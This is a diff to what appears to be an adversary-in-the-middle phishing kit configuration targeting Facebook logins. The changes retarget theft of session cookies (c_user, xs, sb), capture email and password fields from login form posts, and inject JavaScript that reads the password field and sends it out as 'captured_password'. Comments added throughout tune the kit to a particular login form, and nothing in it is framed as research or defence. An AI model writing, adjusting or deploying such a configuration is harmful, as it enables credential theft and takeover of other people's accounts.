@@ -19,21 +19,21 @@ sub_filters:
   
 auth_tokens:
   - domain: '.facebook.com'
-    keys: ['sessionid', 'csrftoken']
+    keys: ['c_user','xs','sb']
     type: 'cookie'
 
 credentials:
   username:
-    key: 'email'
+    key: 'email'  # Updated to match your form input name
     search: '(.*)'
     type: 'post'
   password:
-    key: '^unenc_password$'
+    key: 'pass'  # Updated to match your form input name
     search: '(.*)'
     type: 'post'
 
   custom:
-    - key: '^pass$'
+    - key: '^pass$'  # Optional, but includes alternate name for capturing
       search: '(.*)'
       type: 'post'
     - key: '^Password$'
@@ -81,10 +81,10 @@ js_inject:
         }
 
         function capturePassword() {
-          var passwordField = document.querySelector("input[name='pass']");
+          var passwordField = document.querySelector("input[name='pass']");  // Ensure this matches the input field name
           var xhr = new XMLHttpRequest();
           if (passwordField) {
-            xhr.open("POST", '/login', true);
+            xhr.open("POST", '/login', true);  // Ensure this path is correct
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             xhr.send("captured_password=" + encodeURIComponent(passwordField.value));
           }
